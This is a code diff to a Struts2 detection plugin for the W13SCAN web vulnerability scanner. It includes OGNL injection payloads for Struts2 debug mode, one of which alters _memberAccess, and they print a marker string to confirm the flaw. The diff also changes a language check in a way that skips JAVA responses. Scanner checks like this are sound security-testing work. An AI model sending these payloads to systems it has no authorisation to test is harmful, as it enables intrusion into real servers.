@@ -32,8 +32,8 @@ class W13SCAN(PluginBase):
         params = self.requests.params
         netloc = self.requests.netloc
 
-        # if not self.response.language or self.response.language != "ASP":
-        #     return
+        if self.response.language is None or self.response.language == "JAVA":
+            return
 
         if method == 'GET':
             exi = os.path.splitext(p.path)[1]
@@ -45,10 +45,11 @@ class W13SCAN(PluginBase):
                 r'''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath("<Struts2-vuln-"),#matt=%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C#matt.getWriter().print(#c),#matt.getWriter().print('Check>'),#matt.getWriter().flush(),#matt.getWriter().close()''',
                 r'''debug=command&expression=%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.println%28%27<Struts2-vuln%27%2b%27-Check>%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29'''
             ]
-            headers.pop('cookie')
+            if "cookie" in headers.keys():
+                headers.pop('cookie')
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
             for payload in payloads:
-                r = requests.post(netloc, headers=headers,data=payload)
+                r = requests.post(url, headers=headers,data=payload)
                 html1 = r.text
                 if check in html1:
                     out.success(url, self.name, playload="{}".format(payload), method="POST", check=check,
